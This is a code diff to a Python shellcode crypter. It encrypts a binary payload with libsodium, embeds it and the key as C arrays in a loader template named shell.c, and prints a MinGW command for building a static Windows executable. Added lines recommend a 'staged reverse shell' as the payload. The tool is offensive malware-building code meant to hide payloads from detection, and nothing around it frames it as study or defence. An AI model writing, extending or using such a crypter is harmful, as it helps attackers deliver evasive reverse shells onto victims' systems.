@@ -29,7 +29,6 @@ def generate_key(ask_save_bool=False) -> bytes:
     key = nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)  # 32-byte key
     print(f"Generated key (hex): {key.hex()}")
     if ask_save_bool: ask_save(key.hex())  # Saving as hex for ease
-    print(key)
     return key
 
 def write_to_file(filename: str, data: str, mode = "a"):
@@ -150,6 +149,17 @@ def generate_key_from_password(password="", salt=None, iterations: int = 100000)
     print(key.hex())
     return key
 
+from pathlib import Path
+
+def input_file() -> str:
+    while True:
+        filename = input("Filename (binary): ")
+        print(filename)
+        if Path(filename).exists():
+            return filename
+        print("File does not exist.")
+    
+    
 def valid_hex(string: str) -> bool:
     try:
         bytes.fromhex(string)
@@ -171,23 +181,20 @@ def generate_key_from_password(password, salt):
     return base64.urlsafe_b64encode(kdf.derive(password.encode()))
 
 def shellcode_c_crypter(shellcode_file="", key=""):
+    print("[!] Recommended payload is staged reverse shell.")
     if not key:
-        key = generate_key()  # Ensure we have a key
-    if not shellcode_file:
-        shellcode_file = input("Filename (binary): ")
-
-    encrypted_data = encrypt_file(shellcode_file, key)
+        key = generate_key()
+    shellcode_filename = input_file()
+    encrypted_data = encrypt_file(shellcode_filename, key)
     data_c_array = bytes_to_c_array(encrypted_data)
     key_c_array = bytes_to_c_array(key)
-
     c_template = create_c_template(data_c_array, key_c_array)
-    
     write_to_file("shell.c", c_template, "w")
     print("C code has been written to shell.c")
 
 def create_c_template(encrypted_data_array, key_array, platform=""):
-    """Generate the C template code with the encrypted data and key."""
     template_windows = f"""
+// x86_64-w64-mingw32-gcc shell.c -o shell.exe -lsodium -static
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -296,13 +303,14 @@ int main() {{
 """
     if not platform:
         platform = input("Platform (windows/linux): ")
-        
     if platform == "linux":
         return template_linux
     elif platform == "windows":
+        print("x86_64-w64-mingw32-gcc shell.c -o shell.exe -lsodium -static")
         return template_windows
     else:
         print("Invalid platform. (windows/linux). Defaulting to Windows")
+        print("x86_64-w64-mingw32-gcc shell.c -o shell.exe -lsodium -static")
         return template_windows
 
 
